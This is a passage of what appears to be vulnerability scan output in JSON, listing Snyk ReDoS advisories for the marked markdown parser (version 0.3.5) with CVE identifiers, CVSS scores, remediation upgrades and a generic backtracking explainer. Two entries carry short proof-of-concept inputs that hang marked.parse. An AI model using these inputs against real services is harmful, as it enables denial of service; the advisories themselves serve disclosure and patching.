              "5v2h-r2cx-5xgj"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-MARKED-2342073",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when passing unsanitized user input to `inline.reflinkSearch`, if it is not being parsed by a time-limited worker thread.\r\n\r\n## PoC\r\n```js\r\nimport * as marked from 'marked';\r\n\r\nconsole.log(marked.parse(`[x]: x\r\n\r\n\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](`));\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 4.0.10 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-01-16T09:07:08.101529Z\",\n  \"credit\": [\n    \"MakeNowJust\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when passing unsanitized user input to `inline.reflinkSearch`, if it is not being parsed by a time-limited worker thread.\\r\\n\\r\\n## PoC\\r\\n```js\\r\\nimport * as marked from 'marked';\\r\\n\\r\\nconsole.log(marked.parse(`[x]: x\\r\\n\\r\\n`));\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `marked` to version 4.0.10 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0)\\n\",\n  \"disclosureTime\": \"2022-01-16T08:58:04Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.0.10\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MARKED-2342073\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2022-21681\"\n    ],\n    \"CWE\": [\n      \"CWE-1333\"\n    ],\n    \"GHSA\": [\n      \"GHSA-5v2h-r2cx-5xgj\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-01-16T15:24:00.022317Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-01-16T14:42:47.883887Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.0.10\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@4.0.10\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1333"
            ],
            "cveid": [
              "2022-21680"
            ],
            "ghsaid": [
              "rrrm-qjm4-v8hf"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-MARKED-2342082",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when unsanitized user input is passed to `block.def`.\r\n\r\n## PoC\r\n```js\r\nimport * as marked from \"marked\";\r\nmarked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 4.0.10 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0)\n- [GitHub Release](https://github.com/markedjs/marked/releases/tag/v4.0.10)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-01-16T12:11:35.068696Z\",\n  \"credit\": [\n    \"MakeNowJust\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when unsanitized user input is passed to `block.def`.\\r\\n\\r\\n## PoC\\r\\n```js\\r\\nimport * as marked from \\\"marked\\\";\\r\\nmarked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `marked` to version 4.0.10 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0)\\n- [GitHub Release](https://github.com/markedjs/marked/releases/tag/v4.0.10)\\n\",\n  \"disclosureTime\": \"2022-01-14T21:04:41Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.0.10\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MARKED-2342082\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2022-21680\"\n    ],\n    \"CWE\": [\n      \"CWE-1333\"\n    ],\n    \"GHSA\": [\n      \"GHSA-rrrm-qjm4-v8hf\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-01-16T15:23:59.302316Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-01-16T15:23:59.300943Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0\"\n    },\n    {\n      \"title\": \"GitHub Release\",\n      \"url\": \"https://github.com/markedjs/marked/releases/tag/v4.0.10\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.0.10\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@4.0.10\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-MARKED-451540",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). A  Denial of Service condition could be triggered through exploitation of the `heading` regex.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 0.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/09afabf69c6d0c919c03443f47bdfe476566105d)\n- [GitHub PR](https://github.com/markedjs/marked/pull/1224)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-07-04T15:39:07.026548Z\",\n  \"credit\": [\n    \"Nick Starke\",\n    \"Adam Cazzolla\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). A  Denial of Service condition could be triggered through exploitation of the `heading` regex.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `marked` to version 0.4.0 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/commit/09afabf69c6d0c919c03443f47bdfe476566105d)\\n- [GitHub PR](https://github.com/markedjs/marked/pull/1224)\\n\",\n  \"disclosureTime\": \"2018-04-16T15:34:35Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.4.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MARKED-451540\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:40:50.051801Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-07-04T15:34:22Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/commit/09afabf69c6d0c919c03443f47bdfe476566105d\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/markedjs/marked/pull/1224\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.4.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.4.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1333"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-MARKED-584281",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `em` regex within `src/rules.js` file have multiple unused capture groups which could lead to a denial of service attack if user input is reachable.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = 